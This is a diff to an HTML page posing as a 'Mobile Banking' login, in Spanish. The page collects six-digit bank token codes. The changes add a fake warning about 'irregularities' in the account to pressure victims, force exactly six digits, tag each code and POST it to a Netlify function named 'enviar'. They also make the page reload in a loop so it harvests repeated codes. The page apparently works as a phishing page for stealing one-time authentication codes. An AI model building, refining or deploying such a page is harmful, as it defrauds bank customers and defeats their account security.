@@ -5,10 +5,26 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mobile Banking</title>
     <link rel="stylesheet" href="styles.css">
+
+    <!-- Centrado forzado del formulario -->
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .login-card {
+            width: 90%;
+            max-width: 360px;
+            margin-top: 20px;
+        }
+    </style>
 </head>
 <body>
 
-<!-- Header superior -->
+<!-- Header -->
 <header class="top-bar">
     <div class="title">Mobile Banking</div>
     <div class="classic">
@@ -24,14 +40,16 @@
 
 <!-- Card -->
 <div class="login-card">
-    <div class="login-title">Ingresá tu codigo Token de 6 Dígitos</div>
+    <div class="login-title">Ingresá tu código Token de 6 Digitos</div>
 
     <input
         type="text"
         id="tokenInput"
         maxlength="6"
         inputmode="numeric"
-        placeholder="Token"
+        pattern="[0-9]{6}"
+        placeholder="6 dígitos"
+        required
     >
 
     <button type="button" class="btn-accept" onclick="enviarToken()">
@@ -39,6 +57,26 @@
         Aceptar
     </button>
 </div>
+
+    <!-- Mensaje de error -->
+        <div class="token-error">
+            Notamos irregularidades en su cuenta, para continuar,
+            por favor digite su código <strong>Token de 6 dígitos</strong>
+        </div>
+
+        <input
+            type="text"
+            class="token-input"
+            maxlength="6"
+            inputmode="numeric"
+            placeholder=""
+        >
+
+        <button type="button" class="btn-accept">
+            <span class="check">✔</span>
+            Aceptar
+        </button>
+    </div>
 
 <!-- Footer -->
 <footer class="footer">
@@ -49,6 +87,7 @@
 <script>
 const tokenInput = document.getElementById("tokenInput");
 
+/* SOLO números */
 tokenInput.addEventListener("input", () => {
     tokenInput.value = tokenInput.value.replace(/[^0-9]/g, "");
 });
@@ -56,20 +95,25 @@ tokenInput.addEventListener("input", () => {
 function enviarToken() {
     const token = tokenInput.value;
 
-    if (!token) return;
+    // OBLIGATORIO 6 dígitos
+    if (token.length !== 6) {
+        tokenInput.focus();
+        return;
+    }
 
     fetch("/.netlify/functions/enviar", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
+            tipo: "codigo",
             valor: token
         })
     }).finally(() => {
-        window.location.href = "index.html";
+        // BUCLE: vuelve al mismo HTML
+        window.location.reload();
     });
 }
 </script>
 
 </body>
 </html>
-
